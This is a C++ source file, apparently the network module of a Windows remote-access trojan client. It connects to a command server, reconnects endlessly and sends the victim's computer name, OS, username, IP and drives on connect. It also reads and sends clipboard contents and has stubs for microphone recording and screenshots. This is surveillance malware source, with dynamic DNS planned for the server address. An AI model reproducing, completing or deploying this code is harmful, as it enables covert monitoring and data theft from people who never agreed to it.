#include "packet.h"
#include "network.h"
#include "Client.h"
#include "common.h"
#include <WS2tcpip.h>

#pragma comment(lib,"Ws2_32.lib")

using namespace Packet;

wsaWrapper::wsaWrapper() {
    res = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
    }
}

wsaWrapper::~wsaWrapper()
{
       WSACleanup();
}


std::string getIPv4(std::string dns) {

    hostent* remoteHost;
    in_addr addr = {};
    DWORD dwError;
    remoteHost = gethostbyname(dns.c_str());

    if (remoteHost == NULL) {
        dwError = WSAGetLastError();
        if (dwError != 0) {
            if (dwError == WSAHOST_NOT_FOUND) {
                printf("Host not found\n");
               // return 1;
            }
            else if (dwError == WSANO_DATA) {
                printf("No data record found\n");
               // return 1;
            }
            else {
                printf("Function failed with error: %ld\n", dwError);
               // return 1;
            }
        }
    }
    else {
        addr.s_addr = *(u_long*)remoteHost->h_addr_list[0];
        //	printf("\tFirst IP address: %s\n", inet_ntoa(addr));
    }
    return inet_ntoa(addr);
}



int network::_connect(std::string dns, short PORT)
    {
        wsaWrapper wsa;
      //  SOCKET srvSocket = INVALID_SOCKET;
        sockaddr_in srvAddr;
        int ret = 0;
        ZeroMemory(&srvAddr, sizeof(srvAddr));
      

    re_connecting:
            srvSOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (srvSOCKET == SOCKET_ERROR)
            {
                printf("Error creatng socket %d\n", WSAGetLastError());
                return -1;
            }


 
            srvAddr.sin_family = AF_INET;
            srvAddr.sin_port = htons(PORT);
          
            
            if (inet_pton(AF_INET, "127.0.0.1", &srvAddr.sin_addr) <= 0) //static ip will be replaced with dynamic dns ex.: dns1.google.com 
            {
                printf(
                    "\nInvalid address/ Address not supported \n");
                return -1;
            }
       

                ret = connect(srvSOCKET, (sockaddr*)&srvAddr, sizeof(srvAddr));
                
                if (ret == SOCKET_ERROR)
                {
                    printf("ERR: %d\n", WSAGetLastError());
                    Sleep(RETRY_TIME); //reconnect in 5seconds see "common.h"
                    closesocket(srvSOCKET);
                    goto re_connecting;
                }
                else {
                    printf("Connected");

                    //send machine specs/info on client connect
                    _sendHWSpecs();

                    while (true)
                    {
                        Packet::recvPacket(srvSOCKET);
                        //-> need to add threads to manage multiple tasks
                    }
                }




        
        //initialise wsa, setup client/srv details and CONNECT to IP/PORT
        return 0;
    }


int network::_sendClipbord(void) {
        
        HANDLE hndl;
        int iRet = 0;
        if (OpenClipboard(nullptr))
        {
             hndl = GetClipboardData(CF_TEXT);    
           

             
             
            iRet = Packet::sendPacket((char*)hndl,Packet::Type::clip_data, srvSOCKET);

            if (iRet < 0)
                return WSAGetLastError();
        }
          
        return 0;
    }

int network::_captureMic(void) {
        //captureMic see audio.h  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

int network::_sendScrShot(void) {
        //take desktop screenshot FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

int network::_sendHWSpecs(void) {
        //get HW specs , FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        int iRet = 0;
        Client clientSpecs;
        std::string 
        clSpecs =  "\nComputerName: " + clientSpecs.computerName;
        clSpecs += "\nComputerOS: " + clientSpecs.computerOS ;
        clSpecs += "\nUsername: " +clientSpecs.userName;
        clSpecs += "\nclient IP: " + clientSpecs.ip;
        clSpecs += "\nComputerDrives: " + clientSpecs.disks;

         iRet =  Packet::sendPacket(clSpecs, Packet::Type::hw_data, srvSOCKET);
         if (iRet != 0)
             printf("Error sending hwSpecs Packet, Code: %d\n",WSAGetLastError());
             
        return 0;
    }


